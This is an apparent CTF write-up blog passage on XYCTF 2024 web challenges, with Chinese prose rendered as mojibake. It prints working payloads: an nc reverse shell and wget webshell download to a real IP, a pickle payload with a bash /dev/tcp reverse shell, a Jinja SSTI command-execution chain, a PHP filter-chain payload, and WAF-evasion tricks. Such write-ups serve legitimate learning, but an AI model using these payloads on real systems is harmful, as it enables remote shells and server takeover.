<p>è¿˜æœ‰ä¸€äº›å°ç»•è¿‡ï¼Œè¯»æ–‡ä»¶æ˜¯ç”¨SplFileObject + phpä¼ªåè®®ï¼Œå…·ä½“exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// flag.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">XYCTFNO1</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$crypto0</span> <span class="o">=</span> <span class="s2">&#34;dev1l&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$T1ng</span> <span class="o">=</span> <span class="s2">&#34;yuroandCMD258&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO2</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$crypto0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$adwa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO3</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$KickyMu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$fpclose</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$N1ght</span> <span class="o">=</span> <span class="s2">&#34;oSthing&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XYCTFNO3</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">KickyMu</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XYCTFNO2</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">KickyMu</span> <span class="o">-&gt;</span> <span class="na">adwa</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XYCTFNO1</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//O:8:&#34;XYCTFNO3&#34;:3:{s:7:&#34;KickyMu&#34;;O:8:&#34;XYCTFNO2&#34;:2:{s:7:&#34;crypto0&#34;;N;s:4:&#34;adwa&#34;;O:8:&#34;XYCTFNO1&#34;:2:{s:7:&#34;crypto0&#34;;s:5:&#34;dev1l&#34;;s:4:&#34;T1ng&#34;;s:13:&#34;yuroandCMD258&#34;;}}s:7:&#34;fpclose&#34;;N;s:5:&#34;N1ght&#34;;s:7:&#34;oSthing&#34;;}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250830200954722.png"
	width="2355"
	height="625"
	srcset="/p/xyctf2024/image-20250830200954722_hu6939331913033197748.png 480w, /p/xyctf2024/image-20250830200954722_hu410209179357072111.png 1024w"
	loading="lazy"
	
		alt="image-20250830200954722"
	
	
		class="gallery-image" 
		data-flex-grow="376"
		data-flex-basis="904px"
	
></p>
<h2 id="ç‰¢ç‰¢è®°ä½é€è€…ä¸ºå¤§">ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§
</h2><h3 id="çŸ¥è¯†ç‚¹wageè¿œç¨‹ä¸‹è½½æœ¨é©¬ncåå¼¹shell">çŸ¥è¯†ç‚¹ï¼šwageè¿œç¨‹ä¸‹è½½æœ¨é©¬ã€ncåå¼¹shell
</h3><p><img src="/p/xyctf2024/image-20250905172439469.png"
	width="1288"
	height="837"
	srcset="/p/xyctf2024/image-20250905172439469_hu14740892182799812707.png 480w, /p/xyctf2024/image-20250905172439469_hu14284928717907660848.png 1024w"
	loading="lazy"
	
		alt="image-20250905172439469"
	
	
		class="gallery-image" 
		data-flex-grow="153"
		data-flex-basis="369px"
	
></p>
<p>é™é•¿ï¼Œè€ƒè™‘ç”¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`$_GET[1]`
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åevalçš„å†…å®¹è¢«æ³¨é‡Šäº†ï¼ˆå•è¡Œæ³¨é‡Šï¼‰æˆ‘ä»¬éœ€è¦ç”¨æ¢è¡Œç¬¦%0aç»•è¿‡</p>
<p>æ­¤å¤–æˆ‘ä»¬è¿˜éœ€è¦æ·»åŠ ä¸€ä¸ª<code>#</code>ï¼ˆ%23ï¼‰ç”¨äºæ³¨é‡Šæ‰åé¢çš„å†…å®¹ï¼Œå†åŠ ä¸€ä¸ª<code>;</code>ï¼Œç®—ä¸Šå‰é¢é™é•¿è¦åˆ©ç”¨çš„ï¼Œä¸€å…±åä¸‰ä¸ªå­—ç¬¦ä¸å¤šä¸å°‘ã€‚</p>
<p>æ„é€ å‡º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%0a`$_GET[b]`;%23
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ¬æ¥åˆ°è¿™é‡Œå°±å·²ç»æˆåŠŸäº†ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªwafåœ¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$val_name</span> <span class="o">=&gt;</span> <span class="nv">$val_val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&#34;</span><span class="p">,</span> <span class="nv">$val_val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;what can i say&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>foreach (... as $val_name =&gt; $val_val)</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå¾ªç¯è¯­å¥ï¼Œç”¨äºéå† <code>$_GET</code> æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç”¨getä¼ çš„1ä¹Ÿä¼šè¢«è¿™å±‚wafæ‹¦ä¸‹ã€‚ï¼ˆæ”¹ç”¨POSTä¼šè¶…å­—æ•°ï¼‰</p>
<p>ç„¶åå°±æ˜¯å¦‚ä½•ç»•è¿‡è¿™å±‚waf</p>
<p>å› ä¸ºgetæœ‰è®¸å¤šé™åˆ¶ï¼Œå¯ä»¥ç›´æ¥ç”¨wgetè¿œç¨‹ä¸‹è½½æ–‡ä»¶å†™é©¬æˆ–è€…nc åå¼¹shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=%0a`$_GET[1]`;%23&amp;1=nc 148.135.82.190 8888 -e /bi&#39;&#39;n/sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?b=wget -O ./she.php ip:port/she&amp;cmd=%0a`$_GET[b]`;%23
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§£é‡Šä¸€ä¸‹wget</p>
<p><img src="/p/xyctf2024/image-20250905182415781.png"
	width="1296"
	height="484"
	srcset="/p/xyctf2024/image-20250905182415781_hu7636008068010410565.png 480w, /p/xyctf2024/image-20250905182415781_hu5902284677123853120.png 1024w"
	loading="lazy"
	
		alt="image-20250905182415781"
	
	
		class="gallery-image" 
		data-flex-grow="267"
		data-flex-basis="642px"
	
></p>
<p>è¿™é‡Œæœ¬æ¥ç”¨å†…ç½‘ç©¿é€ç›´æ¥è¿ä¸Šè™šæ‹Ÿæœºçš„ï¼Œä½†æ˜¯å†…ç½‘ç©¿é€çš„åŸŸåé‡Œæœ‰è¢«bançš„å­—æ¯ï¼Œç”¨äº‘æœåŠ¡å™¨åˆé‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œè¿™é‡Œå…ˆæç½®ä¸€ä¸‹ã€‚</p>
<p>æäº†å¾ˆä¹…ï¼Œæœ€åè§£å†³äº†ï¼Œæœ‰å‡ ä¸ªè¦ç‚¹ã€‚</p>
<p>é¦–å…ˆï¼Œä½ çš„äº‘æœåŠ¡å™¨çš„å®‰å…¨ç»„éœ€è¦æ·»åŠ è§„åˆ™ï¼Œæ‰“å¼€ä¸€äº›ç«¯å£ï¼Œæˆ‘æ‰“å¼€çš„æ˜¯9999</p>
<p>ç„¶åéœ€è¦èµ·ä¸€ä¸ªhttpæœåŠ¡ï¼Œä¸ç„¶wgetè¿ä¸ä¸Šã€‚</p>
<p>è¿™é‡Œå¯ä»¥ç”¨pythonå¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 -m http.server 9999
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå¯çš„æœåŠ¡å™¨é»˜è®¤æ˜¯åœ¨rootç›®å½•ä¸‹çš„ï¼Œæ‰€ä»¥é©¬è¦ä¸‹åœ¨rootç›®å½•ä¸‹</p>
<p>æœ€åå°±æ˜¯è¯»å–äº†</p>
<p><img src="/p/xyctf2024/image-20250905222055780.png"
	width="1340"
	height="1173"
	srcset="/p/xyctf2024/image-20250905222055780_hu7628902281760560592.png 480w, /p/xyctf2024/image-20250905222055780_hu18217279405022938294.png 1024w"
	loading="lazy"
	
		alt="image-20250905222055780"
	
	
		class="gallery-image" 
		data-flex-grow="114"
		data-flex-basis="274px"
	
></p>
<p>å¦å¤–ï¼Œè¿™é“é¢˜ç›®è¿˜å¯ä»¥ç”¨<code>cp /flag em</code>åŠ å…«è¿›åˆ¶ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=%0d`$_GET[c]`;%23&amp;c=$&#39;\143\160&#39;+$&#39;\57\146\154\141\147&#39;+$&#39;\145\155&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="è¿è¿çœ‹httpssocsdnnetsosearchqè¿è¿çœ‹spm1001210130017020åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹"><a class="link" href="https://so.csdn.net/so/search?q=%e8%bf%9e%e8%bf%9e%e7%9c%8b&amp;spm=1001.2101.3001.7020"  target="_blank" rel="noopener"
    >è¿è¿çœ‹</a>åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹
</h2><h3 id="çŸ¥è¯†ç‚¹php_filter_chainstringstrip_tagsè¿‡æ»¤php">çŸ¥è¯†ç‚¹ï¼šphp_filter_chainã€string.strip_tagsè¿‡æ»¤php
</h3><p>ä¸€å¼€å§‹æ˜¯ä¸ªè¿è¿çœ‹ï¼Œç„¶åæºä»£ç å‘ç°æ–‡ä»¶åŒ…å«ï¼Œéšä¾¿åŒ…ä¸€ä¸ªï¼Œå‘ç°æç¤ºå»<code>what's_this.php</code></p>
<p><img src="/p/xyctf2024/image-20250905223449785.png"
	width="779"
	height="520"
	srcset="/p/xyctf2024/image-20250905223449785_hu14852634051737142054.png 480w, /p/xyctf2024/image-20250905223449785_hu6161669535415327678.png 1024w"
	loading="lazy"
	
		alt="image-20250905223449785"
	
	
		class="gallery-image" 
		data-flex-grow="149"
		data-flex-basis="359px"
	
></p>
<p>å’ŒezLFIæŒºåƒçš„ï¼Œæ˜¯php_fileter_chainï¼Œ</p>
<p>ç”¨è„šæœ¬<a class="link" href="https://github.com/synacktiv/php_filter_chain_generator"  target="_blank" rel="noopener"
    >Issues Â· synacktiv/php_filter_chain_generator</a></p>
<p>ç”Ÿæˆä¸€ä¸ª&quot;XYCTF&lt;?php&quot;ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠpayloadçš„å€¼æ”¹ä¸ºXYCTFï¼ˆç›´æ¥å†™XYCTFçš„è¯ä¼šæœ‰è„æ•°æ®ï¼‰</p>
<p><img src="/p/xyctf2024/image-20250906152455350.png"
	width="1723"
	height="626"
	srcset="/p/xyctf2024/image-20250906152455350_hu8796381186661454691.png 480w, /p/xyctf2024/image-20250906152455350_hu13242671511960994060.png 1024w"
	loading="lazy"
	
		alt="image-20250906152455350"
	
	
		class="gallery-image" 
		data-flex-grow="275"
		data-flex-basis="660px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯phpæ˜¯éœ€è¦è¿‡æ»¤çš„ï¼ˆæŒ‡çš„æ˜¯æˆ‘ä»¬ç”Ÿæˆçš„&quot;XYCTF&lt;?php&quot;ï¼‰ï¼Œæˆ‘ä»¬æ‰‹åŠ¨åŠ string.strip_tagsè¿‡æ»¤å™¨æ¥å»é™¤phpæ ‡ç­¾</p>
<p>æœ€ç»ˆpaylod</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250906153525603.png"
	width="1318"
	height="521"
	srcset="/p/xyctf2024/image-20250906153525603_hu6009246460203055762.png 480w, /p/xyctf2024/image-20250906153525603_hu17228424555983368299.png 1024w"
	loading="lazy"
	
		alt="image-20250906153525603"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="607px"
	
></p>
<h2 id="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº">æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº
</h2><h3 id="çŸ¥è¯†ç‚¹è„‘æ´sstirequestattrç»•è¿‡">çŸ¥è¯†ç‚¹ï¼šè„‘æ´sstiã€request+attrç»•è¿‡
</h3><p>çˆ†ç ´ï¼Œå¯†ç æ˜¯asdqwe</p>
<p>å¤è¯»æœºä¸€èˆ¬éƒ½æ˜¯sstiï¼Œç„¶åbanäº†{{}}ã€{%%}</p>
<p>è¿™é‡Œæ˜¯å¯ä»¥ç”¨emojiè¡¨æƒ…ä»£æ›¿{{}}ï¼Œè¿™å€’æ˜¯å¯ä»¥é˜²æ­¢fenjingä¸€æŠŠé”äº†</p>
<p>ç„¶åå°±æ˜¯æ™®é€šçš„sstiï¼Œè¿™é‡Œç”¨request+ attrç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?sentence=ğŸ˜¡lipsum|attr(request.args.glo)|attr(request.args.ge)(request.args.o)|attr(request.args.po)(request.args.cmd)|attr(request.args.re)()ğŸ˜¡&amp;glo=__globals__&amp;ge=__getitem__&amp;o=os&amp;po=popen&amp;cmd=cat /flag&amp;re=read
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="login">login
</h2><h3 id="çŸ¥è¯†ç‚¹pickleååºåˆ—åŒ–oæŒ‡ä»¤ç ç»•è¿‡">çŸ¥è¯†ç‚¹ï¼špickleååºåˆ—åŒ–oæŒ‡ä»¤ç ç»•è¿‡
</h3><p>ç™»å½•åï¼ŒæŠ“åŒ…æäº¤å‘ç°æœ‰waf</p>
<p><img src="/p/xyctf2024/image-20250907114139873.png"
	width="1590"
	height="616"
	srcset="/p/xyctf2024/image-20250907114139873_hu12966247631033758075.png 480w, /p/xyctf2024/image-20250907114139873_hu17849293697641709738.png 1024w"
	loading="lazy"
	
		alt="image-20250907114139873"
	
	
		class="gallery-image" 
		data-flex-grow="258"
		data-flex-basis="619px"
	
></p>
<p>æ³¨æ„åˆ°æœ‰ç±»ä¼¼base64ç çš„ä¸œè¥¿ï¼Œè§£ç å‡ºæ¥ä¹±ä¸ƒå…«ç³Ÿï¼Œè¿˜æœ‰appå•¥çš„ï¼Œæ„Ÿè§‰æ˜¯pickleååºåˆ—åŒ–ï¼Œç„¶åè¿™é‡Œåˆæœ‰wafï¼Œé‚£å°±è¯•è¯•ç”¨oæŒ‡ä»¤é›†ç»•è¿‡å§</p>
<p><img src="/p/xyctf2024/image-20250907114311560.png"
	width="1393"
	height="188"
	srcset="/p/xyctf2024/image-20250907114311560_hu6453289917415822669.png 480w, /p/xyctf2024/image-20250907114311560_hu9848840575949466554.png 1024w"
	loading="lazy"
	
		alt="image-20250907114311560"
	
	
		class="gallery-image" 
		data-flex-grow="740"
		data-flex-basis="1778px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/6.tcp.cpolar.top/12932 0&lt;&amp;1&#34;&#39;&#39;&#39;</span>  <span class="c1"># åå¼¹shellè¯­å¥</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/6.tcp.cpolar.top/12932 0&lt;&amp;1&#34;&#39;&#39;&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;(ctimeit
</span></span></span><span class="line"><span class="cl"><span class="s1">timeit
</span></span></span><span class="line"><span class="cl"><span class="s1">(cos
</span></span></span><span class="line"><span class="cl"><span class="s1">system
</span></span></span><span class="line"><span class="cl"><span class="s1">V&#39;&#39;&#39;</span> <span class="o">+</span> <span class="n">shell</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">oo.&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°´å°¬çš„æ˜¯ï¼Œå› ä¸ºbanäº†ræŒ‡ä»¤ï¼Œå†…ç½‘ç©¿é€çš„åŸŸåå°±æœ‰rï¼Œæ‰€æœ‰è¿˜æ˜¯å¾—ç”¨vpså¼¹</p>
<p><img src="/p/xyctf2024/image-20250907155552713.png"
	width="1067"
	height="900"
	srcset="/p/xyctf2024/image-20250907155552713_hu677572590754174922.png 480w, /p/xyctf2024/image-20250907155552713_hu11499683290560488155.png 1024w"
	loading="lazy"
	
		alt="image-20250907155552713"
	
	
		class="gallery-image" 
		data-flex-grow="118"
		data-flex-basis="284px"
	
></p>
<h2 id="give-me-flag">give me flag
</h2><h3 id="çŸ¥è¯†ç‚¹å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»">çŸ¥è¯†ç‚¹ï¼šå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»
</h3><p><img src="/p/xyctf2024/image-20250907155840636.png"
	width="782"
	height="575"
	srcset="/p/xyctf2024/image-20250907155840636_hu11027302654457843487.png 480w, /p/xyctf2024/image-20250907155840636_hu514165466535619098.png 1024w"
	loading="lazy"
	
		alt="image-20250907155840636"
	
	
		class="gallery-image" 
		data-flex-grow="136"
		data-flex-basis="326px"
	
></p>
<p>ä¹‹å‰åœ¨basectfä¸­é‡åˆ°è¿‡è¿™ç§å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ï¼Œå¥½åƒè¿˜ç¨å¾®è§£é‡Šäº†ä¸€ä¸‹ã€‚</p>
<p>è¿™é‡Œè´´ä¸€ä¸ªæ–‡ç« å¥½äº†ï¼Œå°±ä¸æ·±ç©¶äº†</p>
<p><a class="link" href="https://www.cnblogs.com/yunen/p/13624595.html"  target="_blank" rel="noopener"
    >æµ…è°ˆHASHé•¿åº¦æ‹“å±•æ”»å‡» - Yunençš„åšå®¢ - åšå®¢å›­</a></p>
